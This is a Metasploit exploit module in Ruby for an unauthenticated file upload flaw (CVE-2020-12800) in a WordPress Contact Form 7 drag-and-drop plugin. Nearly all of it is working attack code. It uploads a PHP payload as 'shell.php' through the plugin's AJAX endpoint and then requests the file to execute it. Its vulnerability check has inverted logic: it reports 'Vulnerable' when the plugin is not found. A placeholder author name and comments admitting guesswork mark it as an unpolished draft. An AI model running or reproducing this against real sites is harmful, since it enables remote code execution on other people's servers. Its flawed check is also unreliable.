##
# This module requires Metasploit Framework
#

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Drag and Drop Multiple File Upload for Contact Form 7 Unauthenticated File Upload',
      'Description'    => %q{
        This module exploits an unauthenticated file upload vulnerability in the
        'Drag and Drop Multiple File Upload for Contact Form 7' plugin before version 1.3.3.3
        for WordPress. Due to the plugin not properly checking the file being uploaded via
        the 'dnd_codedropz_upload' AJAX action, an attacker can bypass the checks in place
        and upload a PHP file, leading to arbitrary code execution.
        The Contact Form 7 plugin must also be installed.
      },
      'Author'         => [
        'Austin Martin', # Original Researcher
        'your_name'  # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2020-12800'],
        ['EDB', '48520'],
        ['URL', 'https://github.com/amartinsec/CVE-2020-12800'],
        ['WPVDB', '53e47e67-c8c9-45a9-9a9c-da52c37047bf']
      ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [ ['Automatic', {}] ],
      'Privileged'     => false,
      'DisclosureDate' => '2020-05-26',
      'DefaultTarget'  => 0,
      'DefaultOptions' =>
        {
          'TARGETURI' => '/'
        }
    ))

    register_options(
      [
        OptString.new('UPLOAD_PATH', [ true, 'The upload path', 'wp-content/uploads/dnd_uploads/']),
        OptString.new('FILENAME', [true, 'The name of the uploaded PHP file', 'shell.php'])
      ], self.class
    )
  end

  def check
    # Basic check to see if WordPress is present
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'wp-login.php')
    })

    if res && res.code == 200 && res.body.include?('wp-login.php')
      # Check for the plugin by attempting to access a file within the plugin directory.
      # This is just a basic heuristic.  A more robust check would involve querying the
      # database or looking for specific plugin-related HTML elements.
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'drag-and-drop-multiple-file-upload-contact-form-7', 'readme.txt')
      })
      if res && res.code == 200 && res.body.include?('Drag and Drop Multiple File Upload - Contact Form 7')
          Exploit::CheckCode::Detected
      else
          Exploit::CheckCode::Vulnerable
      end
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    php_payload = "<?php #{payload.encoded} ?>"
    filename = datastore['FILENAME']
    upload_path = datastore['UPLOAD_PATH']

    print_status("Uploading payload...")

    data = Rex::MIME::Message.new
    data.add_part(php_payload, 'application/x-php', 'binary', "form-data; name=\"file\"; filename=\"#{filename}\"")
    post_data = data.to_s
    
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' => {
        'action' => 'dnd_codedropz_upload'
      },
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data
    )

    if res
      print_status("Server Response Code: #{res.code}")
      print_status("Server Response Body: #{res.body}")

      if res.code == 200 && res.body.include?('success')
        # Extract the filename from the response. The exploit PoC doesn't
        # have this functionality, so it's only a "best guess" based on how
        # the plugin may name the file on disk.
        #
        # In reality, this should parse the JSON and extract the actual
        # filename.

        # Construct the full URL to the uploaded file
        file_url = normalize_uri(target_uri.path, upload_path, filename)

        print_status("Attempting to execute the payload at #{file_url}")
        
        #Execute the uploaded file
        send_request_cgi(
          'method' => 'GET',
          'uri'    => file_url
        )
      else
        fail_with(Failure::UnexpectedReply, 'File upload failed.')
      end
    else
      fail_with(Failure::Unreachable, 'Target did not respond.')
    end
  end
end